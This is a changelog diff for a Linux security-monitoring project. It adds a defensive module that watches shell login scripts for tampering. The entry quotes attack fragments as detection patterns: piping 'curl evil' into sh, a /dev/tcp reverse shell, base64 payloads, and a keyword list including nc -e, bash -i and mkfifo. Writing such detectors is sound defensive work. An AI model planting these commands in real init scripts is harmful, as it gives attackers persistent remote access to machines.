@@ -6,6 +6,30 @@ Versioning: [SemVer](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+### Added — module-ecosystem batch 31: continuation 113→114 (2026-05-26)
+
+Per operator direction ("continue endlessly"). Closes the shell-init
+login-persistence surface; L1 module-contracts coherent at 114, cargo
+modules::tests 16/16.
+
+- `shell-init-watchdog` (114) — boot+daily delta of the global + root
+  shell-init scripts (/etc/profile, /etc/bash.bashrc|/etc/bashrc,
+  /etc/profile.d/*.sh, /etc/zsh/*, root's ~/.bashrc ~/.bash_profile
+  ~/.profile ~/.zshrc) vs a learned baseline, PLUS a suspicious-pattern
+  scan. An attacker appending `curl evil|sh`, a /dev/tcp reverse shell,
+  or a base64 payload to any init script gets code-exec on every
+  interactive login/shell (T1546.004). Records each file hash + each
+  matched injection pattern (curl|sh, /dev/tcp, nc -e, bash -i,
+  base64 -d, eval $(), python -c, mkfifo, setsid; full-line comments
+  stripped first). Suspicious pattern = alert (delta-independent);
+  hash change = warn. Distinct from ld-preload-watchdog, which scans
+  the same file set only for LD_PRELOAD. MITRE T1546.004/T1059.004/
+  T1037. Cadence boot+12min / 07:05 (extends the ladder after udev).
+
+**Persistence-mechanism family** now covers all four classic Linux
+surfaces: systemd-unit (services) + cron-job (scheduler) + udev-rules
+(device events) + shell-init (login scripts). Module total: 114.
+
 ### Added — module-ecosystem batch 30: continuation 112→113 (2026-05-26)
 
 Per operator direction ("continue endlessly"). Closes the udev
